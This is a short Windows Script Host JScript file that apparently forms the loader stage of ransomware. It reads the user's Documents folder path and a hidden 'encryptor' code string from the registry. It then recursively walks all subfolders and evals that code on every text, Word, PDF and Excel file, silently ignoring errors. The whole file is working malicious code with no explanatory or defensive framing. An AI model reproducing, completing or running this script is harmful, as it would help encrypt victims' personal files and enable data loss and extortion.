var encryptor;
var personalFolderRegistryEntry = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal';
var encryptorRegistryEntry = 'HKLM\\encryptor';
var fileNameToEncryptVar = 'fileNameToEncrypt';
var fso = new ActiveXObject('Scripting.FileSystemObject');
var fileExtList = { 
	txt : 'txt', 
	doc : 'doc', 
	docx : 'docx', 
	pdf : 'pdf', 
	xls : 'xls', 
	xlsx : 'xlsx', 
	xlsm : 'xlsm'
};

function getFileExt(fileShortName) {
	if(fileShortName.indexOf('.') > -1) {
		return fileShortName.split('.').pop().toLowerCase();
	} else {
		return false;
	}
};

function isValidExt(fileShortName) {
	var ext = getFileExt(fileShortName);
	return ext ? fileExtList[ext] : false;
};

function getFiles(folderPath) {
	var folder = fso.GetFolder(folderPath);
	var files = folder.files;
	if(files.count > 0) {
  	var fileList = new Enumerator(folder.files);
  	for (; !fileList.atEnd(); fileList.moveNext()) {
			try {
				if(isValidExt(fileList.item().ShortName)) {
					var evalString = 'var '+fileNameToEncryptVar+' = \''+fileList.item().path.replace(/\\/g, '\\\\')+'\';' + encryptor;
					eval(evalString);
				}
			} catch(err) {}
		}
	}
};

function getFolders(path) {
	var folder = fso.GetFolder(path);
	var subFolders = folder.SubFolders;
	if(subFolders.count > 0) {
		var folderList = new Enumerator(subFolders);
		for (; !folderList.atEnd(); folderList.moveNext()) {
			try {
				getFolders(folderList.item());
			} catch(err) {}
		}
	}
	getFiles(path);
};

function getDocumentFolder() {
	var wsh = new ActiveXObject('WScript.Shell');
	var path = wsh.RegRead(personalFolderRegistryEntry);
	encryptor = wsh.RegRead(encryptorRegistryEntry);
	getFolders(path);
};
getDocumentFolder();